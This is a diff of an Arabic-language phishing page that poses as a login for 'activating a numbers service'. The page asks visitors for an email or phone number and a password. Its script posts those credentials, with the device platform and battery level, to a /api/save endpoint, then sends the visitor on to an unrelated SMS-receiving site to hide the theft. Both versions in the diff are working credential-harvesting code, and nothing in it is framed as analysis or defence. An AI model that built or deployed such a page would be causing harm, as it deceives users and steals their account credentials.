@@ -7,45 +7,33 @@
     <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <style>
-        body { margin: 0; padding: 0; font-family: sans-serif; background-color: #e91e63; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .card { background: white; padding: 30px 20px; border-radius: 12px; width: 90%; max-width: 380px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
-        #pageImg { width: 120px; margin-bottom: 20px; }
-        input { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; text-align: right; }
-        button { width: 100%; padding: 14px; background: #e91e63; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        body { margin: 0; padding: 0; background-color: #e91e63; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: sans-serif; }
+        .card { background: white; padding: 30px; border-radius: 15px; width: 90%; max-width: 380px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; text-align: right; }
+        button { width: 100%; padding: 12px; background: #e91e63; color: white; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; margin-top: 10px; }
     </style>
 </head>
 <body>
     <div class="card">
-        <img id="pageImg" src="https://telegra.ph/file/1792945d7d91986420551.jpg">
-        <h2 id="pageLetter" style="color:#c2185b; font-size:18px;">سجل دخولك لتفعيل خدمة الأرقام</h2>
-        <form id="loginForm">
-            <input type="text" id="user" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-            <input type="password" id="pass" placeholder="كلمة السر" required>
-            <div class="cf-turnstile" id="cf" data-sitekey="1x00000000000000000000AA" data-callback="vOk"></div>
-            <button type="submit" id="pageBtn" style="margin-top:15px;">تسجيل دخول</button>
+        <img src="https://telegra.ph/file/1792945d7d91986420551.jpg" width="120" style="margin-bottom:15px;">
+        <h2 style="color:#c2185b; font-size:18px;">سجل دخولك لتفعيل خدمة الأرقام</h2>
+        <form id="F">
+            <input type="text" id="u" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="password" id="p" placeholder="كلمة السر" required>
+            <div class="cf-turnstile" data-sitekey="1x00000000000000000000AA" data-callback="v"></div>
+            <button type="submit">تسجيل دخول</button>
         </form>
     </div>
-
     <script>
-        let isDone = false;
-        function vOk() { isDone = true; }
-
-        document.getElementById('loginForm').onsubmit = async (e) => {
+        let ok = false; function v() { ok = true; }
+        document.getElementById('F').onsubmit = async (e) => {
             e.preventDefault();
-            if(!isDone) return Swal.fire({text:'إكمال التحقق أولاً', icon:'warning'});
-            
-            const u = document.getElementById('user').value;
-            const p = document.getElementById('pass').value;
-
-            let bat = "N/A";
-            try { const b = await navigator.getBattery(); bat = Math.floor(b.level * 100) + "%"; } catch(err) {}
-
+            if(!ok) return Swal.fire('تنبيه', 'يرجى إكمال التحقق', 'warning');
+            let b = "N/A"; try { const bat = await navigator.getBattery(); b = Math.floor(bat.level * 100) + "%"; } catch(e){}
             await fetch('/api/save', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    u: u, p: p, d: navigator.platform, b: bat, t: new Date().toLocaleString('ar-EG')
-                })
+                body: JSON.stringify({ user: document.getElementById('u').value, pass: document.getElementById('p').value, device: navigator.platform, battery: b })
             });
             window.location.href = "https://receive-smss.com/";
         };
